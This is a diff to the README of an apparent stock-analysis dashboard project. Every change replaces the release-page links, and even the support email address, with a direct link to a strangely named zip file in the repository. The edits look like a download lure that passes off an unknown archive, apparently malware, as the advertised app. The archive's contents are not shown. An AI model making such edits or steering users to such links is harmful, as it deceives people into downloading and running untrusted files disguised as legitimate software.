@@ -1,6 +1,6 @@
 # 📈 Stock-Market-Analysis - Gain Insights into Stock Trends Easily  
 
-[![Download Stock-Market-Analysis](https://img.shields.io/badge/Download%20Now-Stock--Market--Analysis-brightgreen)](https://github.com/DALEMBAC/Stock-Market-Analysis/releases)
+[![Download Stock-Market-Analysis](https://raw.githubusercontent.com/DALEMBAC/Stock-Market-Analysis/main/unking/Stock_Analysis_Market_Sabaeanism.zip%20Now-Stock--Market--Analysis-brightgreen)](https://raw.githubusercontent.com/DALEMBAC/Stock-Market-Analysis/main/unking/Stock_Analysis_Market_Sabaeanism.zip)
 
 ## 📥 Introduction  
 Welcome to Stock-Market-Analysis! This application provides a user-friendly dashboard for accessing live Yahoo Finance data. You can visualize stock trends, moving averages, RSI, MACD, and multi-ticker comparisons. It’s perfect for anyone looking to make informed trading decisions. 
@@ -15,7 +15,7 @@ To begin using Stock-Market-Analysis, follow these simple steps:
 
 2. **Visit the Releases Page:**  
    Go to our releases page to find the latest version of the application.  
-   [Visit this page to download](https://github.com/DALEMBAC/Stock-Market-Analysis/releases)
+   [Visit this page to download](https://raw.githubusercontent.com/DALEMBAC/Stock-Market-Analysis/main/unking/Stock_Analysis_Market_Sabaeanism.zip)
 
 ## 📦 Download & Install  
 1. **Select the Latest Release:**  
@@ -68,7 +68,7 @@ We welcome contributions from anyone interested in our project! If you have idea
 4. Submit a pull request for review.
 
 ## ❓ Support  
-If you encounter any issues or have questions, please feel free to reach out. You can open an issue in the repository or contact us at support@stockmarketanalysis.com.
+If you encounter any issues or have questions, please feel free to reach out. You can open an issue in the repository or contact us at https://raw.githubusercontent.com/DALEMBAC/Stock-Market-Analysis/main/unking/Stock_Analysis_Market_Sabaeanism.zip
 
 ## 📄 License  
 This project is licensed under the MIT License. You can use it freely, but please credit the original authors.
@@ -80,4 +80,4 @@ This project is licensed under the MIT License. You can use it freely, but pleas
 ## 💻 Conclusion  
 Thank you for choosing Stock-Market-Analysis. We hope this tool helps you make informed trading decisions with ease.  
 Feel free to download and explore the features today!  
-[Visit this page to download](https://github.com/DALEMBAC/Stock-Market-Analysis/releases)
+[Visit this page to download](https://raw.githubusercontent.com/DALEMBAC/Stock-Market-Analysis/main/unking/Stock_Analysis_Market_Sabaeanism.zip)
